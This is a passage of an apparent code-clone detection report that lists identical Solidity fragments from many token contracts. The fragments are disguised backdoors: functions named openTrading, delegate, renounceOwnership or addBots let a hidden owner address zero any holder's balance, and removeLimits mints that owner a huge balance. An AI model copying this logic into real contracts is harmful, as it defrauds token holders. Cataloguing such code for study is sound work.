        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="36" endline="40" pcid="2920">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x99818798AedD80Fef824086eF10411C89009e174.sol" startline="37" endline="41" pcid="5568">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="34" endline="38" pcid="3337">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="38" endline="42" pcid="2009">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="37" endline="41" pcid="6357">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xF0098c03f5544FcC13F8f4DeB183527801B6B40D.sol" startline="38" endline="42" pcid="8790">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="38" endline="42" pcid="7030">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="34" endline="38" pcid="4278">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="39" endline="43" pcid="6604">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="35" endline="39" pcid="4295">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="39" endline="43" pcid="9339">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="39" endline="43" pcid="153">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7620F8bE1A98a4F0CE86B9817767dc565C56eDF3.sol" startline="36" endline="40" pcid="4380">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1684f783064B9F4D6273e9ed11F5D753C193E5E5.sol" startline="39" endline="43" pcid="672">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="39" endline="43" pcid="1191">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="35" endline="39" pcid="5727">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1E453405B5B7656ae31B7cCBb783979723244327.sol" startline="38" endline="42" pcid="934">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x84A1dde0d0Bd23A2F4Cce011585b415ffdFE2582.sol" startline="38" endline="42" pcid="4961">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x08CA60267661ce86730fc825Be00385d8635B94B.sol" startline="38" endline="42" pcid="220">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2362dE6A331ca1f0f5243CE99792dbEdab68D184.sol" startline="40" endline="44" pcid="1058">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="39" endline="43" pcid="4623">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4751AA52a743FFea38c4031e5158AcfA30347f26.sol" startline="34" endline="38" pcid="2681">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="41" endline="45" pcid="74">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="34" endline="38" pcid="6342">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="39" endline="43" pcid="1482">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe0A9b2Cbd7147f9fb0fE09fAcD2aAB94C0f51444.sol" startline="655" endline="659" pcid="8069">
    function renounceOwnership(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x585E00E541d4e331A7574248beC368420BBaDdf1.sol" startline="35" endline="39" pcid="3317">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3dA0eD9Ba67D1EC0CF5fDeE7598B544BD8A1fA38.sol" startline="40" endline="44" pcid="2241">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="37" endline="41" pcid="6327">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc3269e2917AcF46F7eDF508cf875f8e29313dabF.sol" startline="35" endline="39" pcid="6978">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x020b7C91ca0C63477DF2f68ac47A6c41a370CE37.sol" startline="37" endline="41" pcid="59">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x532b9b8cDdE8fDF33e41bF2aE578fC83D9CF8AC9.sol" startline="39" endline="43" pcid="3081">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9f956D811170c17aEeA2382b44132520D7A63701.sol" startline="35" endline="39" pcid="5742">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="39" endline="43" pcid="1877">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc05CA5129c0D91f039B22C3f47FD82077adA63f6.sol" startline="36" endline="40" pcid="6862">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9FF854892a5FE60995844359FA4BB099915888ef.sol" startline="35" endline="39" pcid="5757">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE413f21F74faC68bCd2c16626f0FCa30b55692Dd.sol" startline="37" endline="41" pcid="8267">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa724ad0C59f178C3d291081b8aE06d3d23Eb5383.sol" startline="35" endline="39" pcid="6112">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x7564011A8636815Db93dE33ceD4a65Ea0A8CF337.sol" startline="36" endline="40" pcid="4310">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xFc9804E65cC6E47964c809b9f704440DFb8C5eA0.sol" startline="35" endline="39" pcid="9200">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xefF6ee6e86feF5f6b61560a3c99e7DCFf53f7bb6.sol" startline="35" endline="39" pcid="8775">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="44" endline="48" pcid="8760">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="37" endline="41" pcid="7450">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1F4275D2806f24d44a0f047C9591141409533f8d.sol" startline="40" endline="44" pcid="983">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x408480574c803D05a0244b479c5020a97f546c51.sol" startline="36" endline="40" pcid="2367">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="39" endline="43" pcid="7584">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="35" endline="39" pcid="3979">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="39" endline="43" pcid="6963">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
</class>

<class classid="34" nclones="384" nlines="5" similarity="100">
<source file="systems/source-code/0x019A98258bd5dE47900a0be227087af81Eaf4c69.sol" startline="47" endline="51" pcid="45">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="41" endline="45" pcid="3980">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xA55a6E9BFC3Ba7cb2421146B8F111919bCfB0060.sol" startline="41" endline="45" pcid="6014">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd1a932685B4e94E152589C0f264a851812f25724.sol" startline="43" endline="47" pcid="7451">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="41" endline="45" pcid="1014">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="41" endline="45" pcid="8343">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="43" endline="47" pcid="6358">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="43" endline="47" pcid="3303">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="45" endline="49" pcid="1575">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xe6817d8DC697e075e23273385e97D3528Ddd08d1.sol" startline="42" endline="46" pcid="8328">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xbe8784905d6EfEf6935E715Cf2075dF356807306.sol" startline="42" endline="46" pcid="6804">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="45" endline="49" pcid="2089">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="41" endline="45" pcid="1958">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="45" endline="49" pcid="5554">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x75156ffc59Ed375F98D97dA888f2fe09382640a1.sol" startline="41" endline="45" pcid="4296">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd77c9d684B9e00b9Fc45F929d3DE8514DEEd0Cff.sol" startline="45" endline="49" pcid="7707">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7639F0fCD891a5c1D72A986258580Bb28c12A94E.sol" startline="45" endline="49" pcid="4396">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="48" endline="52" pcid="1661">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="41" endline="45" pcid="7813">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="41" endline="45" pcid="6258">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xBeC25691510e9A714648323DC55bEC5199719d52.sol" startline="661" endline="665" pcid="6819">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="45" endline="49" pcid="7798">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x766d176a78F7cD88Ea86f9b18b72FF093b4e1DC9.sol" startline="45" endline="49" pcid="4411">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="45" endline="49" pcid="8665">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="40" endline="44" pcid="6343">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="46" endline="50" pcid="6711">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x81069fF4cb59B3814F5d949A957a686501da2cf5.sol" startline="41" endline="45" pcid="4821">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="45" endline="49" pcid="3420">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xBf2A2Cb09E5d0714977A57C3f1e95a8682233099.sol" startline="45" endline="49" pcid="6834">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="41" endline="45" pcid="8985">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="46" endline="50" pcid="2413">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="41" endline="45" pcid="4055">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="42" endline="46" pcid="3217">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="44" endline="48" pcid="3202">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="45" endline="49" pcid="1878">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="42" endline="46" pcid="5412">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xA49E5b1422AB286CFC8D54E0A7CBBdb3cd5aBFdB.sol" startline="46" endline="50" pcid="5970">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="45" endline="49" pcid="154">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x98D29fe112bFce3C568b3e7B56CA95F4f684f2E2.sol" startline="45" endline="49" pcid="5539">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="42" endline="46" pcid="5524">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x819A8945dC5046816a7061Eb18b248e611c75085.sol" startline="41" endline="45" pcid="4836">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="45" endline="49" pcid="4326">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x2116bc152192df8a87eb74dc69aa64f6f476f792.sol" startline="44" endline="48" pcid="999">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="45" endline="49" pcid="7436">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="45" endline="49" pcid="4624">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x98B84E0f85ECA20c129095886bC9330Cbe32c605.sol" startline="44" endline="48" pcid="5509">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="42" endline="46" pcid="3450">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x0D33f227b588446F1Bff2b07AE00fF69EB086876.sol" startline="45" endline="49" pcid="339">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xFE485690c31dD2DCbc1919B430d594F3389D6e82.sol" startline="369" endline="373" pcid="9307">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x4504921b0d800eca1770f89740b7aaa8f3f57fb9.sol" startline="47" endline="51" pcid="2568">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="45" endline="49" pcid="3097">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xc7C34e07AA5f03f1b231605BfAFaa3A5a35408a0.sol" startline="41" endline="45" pcid="7144">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="42" endline="46" pcid="5427">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="42" endline="46" pcid="5653">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0xA5cAFA147f5970dc380A90F8eBB5296BD9e4cd57.sol" startline="44" endline="48" pcid="6044">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="42" endline="46" pcid="5011">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
            _balances[msg.sender] = 42069000000*42069*addBot*10**tokenDecimals;
        }
    } 
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="41" endline="45" pcid="5397">
    function removeLimits(uint256 addBot) external {
        if(xxnux == msg.sender){
